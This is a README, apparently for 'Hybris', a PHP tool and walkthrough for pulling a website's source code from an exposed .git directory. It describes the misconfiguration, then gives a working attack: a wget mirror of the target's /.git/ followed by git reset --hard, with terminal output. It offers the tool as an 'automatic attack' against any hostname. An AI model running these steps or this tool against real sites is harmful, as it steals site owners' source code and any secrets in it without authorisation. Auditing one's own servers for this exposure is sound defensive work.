# Hybris

## Genesis

#### The .git directory

So, let’s begin. When you create a git repo, using git init, git creates this wonderful directory: the .git. This folder contains all the informations needed for git to work. To be clear, if you want to remove git from your project, but keep your project files, just delete the .git folder. But come on, why would you do that?


#### Lazy developer

Sometimes developers use git also to make deploys to server. They going to public directory with initialized git repository and execute pull command.
```bash
$ git pull
```

Code will be update up to server and .git dir will be exists

#### Bad Apache2 configuration

If on apache2 DirectoryListing is enabled you can go to .git directory by browser and see all config and object files
```
http://example.com/.git/
```

Like that:

```
Index of /.git
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-
[   ]	HEAD	2018-11-21 22:21	23
[DIR]	branches/	2018-11-21 22:21	-
[   ]	config	2018-11-21 22:21	271
[   ]	description	2018-11-21 22:21	73
[DIR]	hooks/	2018-11-21 22:21	-
[   ]	index	2018-11-21 22:21	617
[DIR]	info/	2018-11-21 22:21	-
[DIR]	logs/	2018-11-21 22:21	-
[DIR]	objects/	2018-11-21 22:21	-
[   ]	packed-refs	2018-11-21 22:21	107
[DIR]	refs/	2018-11-21 22:21	-
Apache/2.4.18 (Ubuntu) Server at grabower.me Port 80
```

### Attack method

At first you have to download mirror of .git directory:

```bash
$ wget --mirror -I .git http://example.com/.git/ -q --show-progress
```

Next go to downloaded directory

```bash
$ cd example.com
```

Right now you are on something link git repository with removed all files.

```bash
$ git status
```

```bash
On branch master
Your branch is up-to-date with 'origin/master'.
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

	deleted:    CliAlert.php
	deleted:    CliComponent.php
	deleted:    CliFormat.php
	deleted:    CliText.php
	deleted:    CliTypo.php
	deleted:    README.md
	deleted:    composer.json

no changes added to commit (use "git add" and/or "git commit -a")

```

So if file was removed you can reset status of repository and recreate files..

```bash
$ git reset --hard
```

```bash
HEAD is now at 8d87069 update doc
```

Results?
```bash
$ ls -all
```

```bash
total 80
drwxr-xr-x  10 adriangrabowski  staff   320 Nov 22 09:09 .
drwxr-xr-x+ 93 adriangrabowski  staff  2976 Nov 22 09:07 ..
drwxr-xr-x  23 adriangrabowski  staff   736 Nov 22 09:10 .git
-rw-r--r--   1 adriangrabowski  staff  1061 Nov 22 09:09 CliAlert.php
-rw-r--r--   1 adriangrabowski  staff  6213 Nov 22 09:09 CliComponent.php
-rw-r--r--   1 adriangrabowski  staff  6592 Nov 22 09:09 CliFormat.php
-rw-r--r--   1 adriangrabowski  staff  2138 Nov 22 09:09 CliText.php
-rw-r--r--   1 adriangrabowski  staff   610 Nov 22 09:09 CliTypo.php
-rw-r--r--   1 adriangrabowski  staff  7829 Nov 22 09:09 README.md
-rw-r--r--   1 adriangrabowski  staff   651 Nov 22 09:09 composer.json
```

All files from repository are restored, so you have a webpage code without access to FTP/SSH servers :)

## Hybris tool as automatic attack

### Requirements

Code is written in PHP with composer libraries. To run this code you have to install:

* git
* php >= 5.6
* composer

### Usage

Very simple :)

```bash
$ php hybris.php [hostname]
```

```bash
$ php hybris.php example.com
```

Code will verify /.git/ directory exist. If no

```bash
$ php hybris.php google.com

***********************************************************************
*                 Git directory not exist on web page                 *
***********************************************************************
```

In /.git/ directory will be exist on server script automatically create mirror and restore files of webpage in '**output**' directory